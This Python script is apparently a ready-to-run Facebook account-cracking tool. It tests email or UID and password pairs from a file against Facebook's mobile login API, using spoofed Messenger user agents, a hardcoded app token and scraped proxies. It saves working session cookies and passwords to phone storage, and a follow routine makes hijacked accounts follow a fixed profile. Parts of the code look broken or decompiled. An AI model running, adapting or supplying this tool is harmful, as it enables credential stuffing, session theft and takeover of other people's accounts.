import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
ugen= []
for x in range(10000):
    ua_string="Dalvik/2.1.0 (Linux; U; Android "+str(random.choice(range(4,14)))+"; Redmi Note 8T MIUI/V"+str(random.choice(range(7,14)))+".0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/"+str(random.choice(range(100,450)))+".0.0.15.117;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
    se=f'{ua_string}'
    ugen.append(se)
A = '\x1b[1;97m' 
green = '\x1b[38;5;82m'
haha = '\x1b[38;5;51m'
B = '\033[1;32m' 
haha2 = '\x1b[38;5;161m'
C = '\x1b[1;91m' 
sada = '\x1b[38;5;255m'
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
 #Dalvik/2.1.0 (Linux; U; Android "+str(random.choice(range(4,14)))+"; Redmi Note 8T MIUI/V"+str(random.choice(range(7,14)))+".0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/"+str(random.choice(range(100,450)))+".0.0.15.117;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/"+str(random.choice(range(150999999,300999999)))+";FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"
for xd in range(10000):
    aa='Dalvik/2.1.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' SM-G780G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/'
    h=random.randrange(109,379)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(20,100)
    l='FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/537314828;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBDV/SM-G780G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2168};FB_FW/1'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def logox():
    os.system('clear')  
    print(f"""  {green}┏┓┏┓┏┓┓┏┓┳┏┓  ┏┓┏┓┏┓┏┳┓┳┓┏┓┏┓┏┳┓┏┓┳┓
  ┃ ┃┃┃┃┃┫ ┃┣   ┣  ┃┃  ┃ ┣┫┣┫┃  ┃ ┃┃┣┫
  ┗┛┗┛┗┛┛┗┛┻┗┛  ┗┛┗┛┗┛ ┻ ┛┗┛┗┛  ┻ ┗┛┛┗
{haha}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def line():
	print(f'{haha}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def main():
	os.system('clear')
	logox()
	print(f'{haha2}[{green}1{haha2}] {sada}EXTRACT COOKIE')
	print(f'{haha2}[{green}2{haha2}] {sada}EXIT TOOL')
	line()
	sefat = input(f'{haha2}[{green}>{haha2}] {sada}SELECT : ')
	if sefat in ["1", "01"]:
		file()
	elif sefat in ["2"," 02"]:
		exit()
def file():
    os.system('clear')
    logox()
    user = []
    pwx = []  
    code = input(f'{haha2}[{green}>{haha2}] {sada}FILE {haha2}[{sada}MAIL{haha2}/{sada}UID{green}|{sada}PAS{haha2}] {sada}: ');line()
    try:
        file = open(code,'r').read().splitlines()
    except:print("[!] FILE NOT FOUND!!")
    with ThreadPool(max_workers=1) as LEE:
        tl = str(len(file))
        for love in file:
            uid = love.split('|')[0]
            pw = love.split('|')[1]
            pwx.append(pw)
            LEE.submit(rcrack,uid,pwx,tl)

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    sys.stdout.write(f'\r{haha2}[{green}>{haha2}] {sada}EXTRACTING {loop}-{tl} - {green}{len(oks)}{sada} | {haha2}{len(cps)}'),
    sys.stdout.flush()
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': pro,
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            lo=session.post(url1,data=data,headers=head).json()
            if 'session_key' in lo:
                coki=";".join(i["name"]+"="+i["value"] for i in lo["session_cookies"])	
                ui = re.findall('c_user=(.*);xs', coki)[0]
                res = requests.get(f'https://graph.facebook.com/{ui}/picture?type=normal').text
                if 'Photoshop' in res:
                    print(f"\r{haha2}[{green}>{haha2}] {sada}GET COOKIE FROM - {green}{ui}")
                    open('/sdcard/FOTMET-1.txt', 'a').write(uid+'|'+ui+'|'+ps+'|'+coki+'\n')
                    open('/sdcard/FOTMET-2.txt', 'a').write(ui+'|'+ps+'|'+uid+'|'+coki+'\n')
                    open('/sdcard/FOTMET-3.txt', 'a').write(ui+'|'+ps+'|'+coki+'\n')
                    oks.append(id)
                    break
                else:pass
            elif 'www.facebook.com' in str(lo):
                open('/sdcard/cp.txt', 'a').write(id+'|'+ps+'\n')
                cps.append(id)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
logo = ""
main()
